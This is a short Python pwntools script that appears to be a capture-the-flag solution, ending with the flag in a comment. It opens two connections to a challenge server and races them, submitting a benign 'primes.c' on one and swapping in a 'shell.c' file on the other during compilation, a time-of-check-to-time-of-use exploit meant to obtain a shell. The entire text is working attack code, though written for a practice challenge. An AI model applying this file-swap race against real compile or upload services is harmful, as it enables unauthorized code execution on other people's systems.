from pwn import *
from base64 import b64encode

r = remote("0.cloud.chals.io", 10840)

with open("primes.c", "rb") as f:
    ori = b"".join(f.readlines())


r2 = remote("0.cloud.chals.io", 10840)

with open("shell.c", "rb") as f:
    fake = b"".join(f.readlines())
r2.sendline(b"primes.c") 

r.sendline(b"primes.c") 
r.sendline(b64encode(ori))

r.recvuntil(b"Compiling")
r2.sendline(b64encode(fake))

r.interactive()
#TBTL{T1m3_0f_chEck_70_tIM3_0f_PWN}